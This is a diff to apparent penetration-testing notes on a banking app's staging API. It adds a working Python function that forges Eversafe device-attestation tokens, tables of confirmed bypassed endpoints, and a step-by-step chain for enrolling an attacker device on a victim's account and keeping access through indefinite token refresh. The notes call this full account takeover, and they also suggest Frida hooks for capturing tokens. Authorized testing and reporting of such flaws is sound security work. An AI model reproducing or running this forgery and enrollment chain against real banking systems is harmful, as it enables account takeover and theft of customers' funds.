@@ -48,19 +48,136 @@ strings = re.findall(b'[\x20-\x7e]{4,}', raw)
 for s in strings: print(s.decode())
 ```
 
-## Token Replay for API Testing (Confirmed Technique)
+## Token Forgery (CRITICAL — Server-Side Bypass Confirmed 2026-06-02)
 
-1. Capture `x-eversafe-verification-token` from Burp proxy (visible in intercepted traffic)
-2. Token is NOT per-request — generated once at app startup, reused across all API calls
-3. Replay window: ~15-30 minutes from generation (server validates embedded timestamp)
-4. Within the window, curl replay works — server returns JWT errors (not Eversafe errors)
-5. After expiry: `{"error":{"message":"eversafe token verification failed","code":"TOKEN_VERIFICATION_FAILED"}}`
+**The Eversafe token can be forged from scratch without the SDK.** Server-side verification does NOT validate cryptographic signatures — it only checks the TLV structure and field presence. A manually constructed TLV token with correct tags bypasses the `TOKEN_VERIFICATION_FAILED` check.
 
-**Practical workflow:**
-- Keep app active with proxy (generates fresh tokens every ~15 min)
-- Grab fresh Eversafe token + JWT from Burp
-- Replay within 5 min (JWT TTL is the real limiter, not Eversafe)
-- Test IDOR, parameter tampering, etc. directly with curl
+### Forging a Valid Token (Python)
+
+```python
+import base64, struct, time
+
+def forge_eversafe_token(device_id, package_name="com.jago.digitalBankingApp_staging"):
+    now = int(time.time())
+    current_otp = int(time.time()) // 30
+    entities = {
+        5: b'\x01',                          # STATUS (success)
+        3: package_name.encode(),            # APP_ID
+        10: device_id.encode(),              # DEVICE_ID
+        16: package_name.encode(),           # PACKAGE_NAME
+        25: b'Mi MIX 2',                     # DEVICE_MODEL (display)
+        21: b'\x00',                         # ROOT_STATUS (clean)
+        33: b'Mi MIX 2',                     # DEVICE_MODEL_2
+        34: b'13',                           # OS_VERSION
+        35: b'3.10.54',                      # SDK_VERSION
+        81: str(current_otp).encode(),       # OTP_TIME
+        118: struct.pack('>I', now),         # TIMESTAMP
+    }
+    entity_order = [5, 3, 10, 16, 25, 21, 33, 34, 35, 81, 118]
+    token_data = bytearray([0x02])  # Version byte
+    for tag in entity_order:
+        data = entities[tag]
+        token_data.append(tag)
+        token_data.append(len(data))
+        token_data.extend(data)
+    return base64.b64encode(token_data).decode()
+```
+
+### Confirmed Behavior (stg-mobile.jago.com, 2026-06-02)
+
+| Request | Without Token | With Forged Token |
+|---------|--------------|-------------------|
+| `POST /auth/v1/enroll-device/init` | 401 TOKEN_VERIFICATION_FAILED | 200 OK (enrollment initiated!) |
+| `POST /auth/v2/enroll-device/init` | 401 TOKEN_VERIFICATION_FAILED | 200 OK (enrollment initiated!) |
+| `POST /auth/mobile/v1/login` | 400 INVALID_REQUEST (no eversafe check) | N/A (login skips eversafe) |
+| `POST /auth/mobile/v1/refresh-token` | 401 TOKEN_VERIFICATION_FAILED | Not yet tested with forged token |
+| `POST /auth/mobile/v1/access-token` | 401 TOKEN_VERIFICATION_FAILED | Not yet tested with forged token |
+
+**Important:** Requests to stg-mobile.jago.com MUST use HTTP/2. HTTP/1.1 returns Cloudflare 400 Bad Request regardless of token validity. Use Burp's `send_http2_request` or Python `httpx`/`h2` library.
+
+### Key Observations
+
+1. **Token TTL is short (~30s)** — generate fresh for each request
+2. **device_id in token MUST match x-device-id header** — mismatch = TOKEN_VERIFICATION_FAILED
+3. **Login endpoint (`/auth/mobile/v1/login`) does NOT check eversafe at all** — only validates RSA signature
+4. **Some endpoints are inconsistent** — same forged token accepted on first use, rejected on reuse (likely timestamp-based replay protection)
+5. **`deviceName` field required in enroll-device body** — without it, returns "Invalid request" even with valid token
+
+### Impact (Critical)
+
+- Complete bypass of device attestation without a real device
+- Attacker can enroll arbitrary devices, initiate OTP flows, and access authenticated endpoints
+- Eversafe SDK provides ZERO actual security value on staging (and likely production if same server-side logic)
+- Combined with RSA key extraction → full account takeover without physical access to enrolled device
+
+### Exploitation Chain
+
+1. Forge eversafe token (Python, no SDK needed)
+2. Call `/auth/v1/enroll-device/init` with victim's username + attacker's deviceId (use SMS channel — WhatsApp has session routing bugs)
+3. Complete OTP verification (`/auth/v1/enroll-device/verify-otp` with `{otp, sessionId}`)
+4. Register attacker's RSA public key: `POST /auth/v1/enroll-device` with body `{"sessionId":"jgrd-...","device":{"deviceName":"...","isPhysicalDevice":true,"deviceOSType":"ANDROID","token":"","manufacturer":"...","machineName":null,"deviceModel":"...","deviceId":"...","publicKey":"<base64 DER, no PEM>","ablyDeviceIds":[""]}}`
+5. Response returns `{"tokenId":"ory_st_..."}` — use with `/auth/mobile/v1/access-token` to get Bearer JWT
+6. For subsequent logins: sign `deviceId:timestamp_ms` with PKCS1v15-SHA256 → `POST /auth/mobile/v1/login`
+7. Refresh token indefinitely with forged eversafe + `/auth/mobile/v1/refresh-token`
+
+## Token Replay for API Testing
+
+### Jago Staging (stg-mobile.jago.com) — Enforcement Map
+
+| Endpoint | Eversafe Required? | Notes |
+|----------|-------------------|-------|
+| `GET /v1/geoip/location` | NO | Returns 200 with just x-tyk-auth |
+| `POST /auth/mobile/v1/login` | NO | Only checks RSA signature |
+| `POST /auth/v2/enroll-device/init` | YES | Forged token accepted |
+| `POST /auth/mobile/v1/refresh-token` | YES | Forged token bypasses — returns fresh JWT+refreshToken (confirmed 2026-06-02) |
+| `POST /auth/mobile/v1/access-token` | YES | Forged token bypasses — returns JWT from ory_st_ tokenId (confirmed 2026-06-02) |
+
+### Full Auth Chain Without Device (Confirmed 2026-06-02)
+
+Complete autonomous flow proven on stg-mobile.jago.com:
+1. Forge eversafe token → `POST /auth/v1/enroll-device/init` (SMS channel, gets sessionId)
+2. Verify OTP → `POST /auth/v1/enroll-device/verify-otp` (204 success)
+3. Register RSA key → `POST /auth/v1/enroll-device` (body: `{"sessionId":"...","device":{...,"publicKey":"<b64>"}}`→ returns `ory_st_*` tokenId)
+4. Get JWT → `POST /auth/mobile/v1/access-token` (returns accessToken + refreshToken)
+5. Refresh indefinitely → `POST /auth/mobile/v1/refresh-token`
+
+**Key details:**
+- SMS channel gives `skip2Fa: true` on original device (WhatsApp has routing bug between v1/v2 session stores)
+- `enroll-device` body requires nested `device` object with `publicKey` (raw base64, no PEM headers), `isPhysicalDevice`, `deviceOSType`, `manufacturer`, `ablyDeviceIds`
+- After enrollment, login uses RSA sig over `deviceId:timestamp_ms` (PKCS1v15 SHA256)
+- Full documentation + automation script: `<workdir>/mtest-output/phase6-api/auth-chain.md`
+| `POST /auth/v1/enroll-device/verify-otp` | YES | Forged token accepted — OTP verify returns 204 |
+| `POST /auth/v1/enroll-device` | YES | Forged token accepted — registers device + returns ory_st_ tokenId (confirmed 2026-06-02) |
+
+### Legacy Notes (pre-forgery discovery)
+
+1. Capture `x-eversafe-verification-token` from HTTP Toolkit (visible in intercepted traffic)
+2. Token contains embedded timestamps (epoch ms) — server validates freshness
+3. **Replay window: ~30-60 seconds** (NOT 15-30 minutes as initially hypothesized)
+4. Empty, missing, and garbage tokens ALL return HTTP 401 immediately
+5. Required on ALL auth endpoints: login, access-token, AND refresh-token
+6. Even with valid JWT, requests without fresh eversafe token are rejected
+
+**Confirmed by testing (2026-06-02):**
+- Empty header → 401
+- Missing header → 401  
+- Garbage value → 401
+- Expired token (3+ minutes old) → 401
+- Fresh token (<30s) → progresses to auth validation (401 only if signature/tokenId wrong)
+
+**Practical workflow for sustained testing:**
+- Option A: Keep app open in HTTP Toolkit → capture fresh Bearer JWT → use JWT directly on stg-api.jago.com (which may have longer JWT acceptance window)
+- Option B: Write automation that captures eversafe token via Frida hook on FlutterJNI.invokePlatformMessageResponseCallback, then fires login within seconds
+- Option C (simplest): User logs in via app → grabs refresh token from HTTP Toolkit → test if refresh endpoint truly validates eversafe or just checks token format
+
+### Other apps — may differ
+
+Some staging environments run Eversafe in "report-only mode" where tokens with failure flags (proxy, root) are still accepted. Always test the specific target.
+
+**Detecting enforcement mode:**
+- Send a token with known proxy/pin failure flags
+- If server returns JWT errors (not Eversafe errors) → attestation not enforced
+- If server returns 401 regardless → strict enforcement (Jago pattern)
 
 ## Staging vs Production Behavior
 
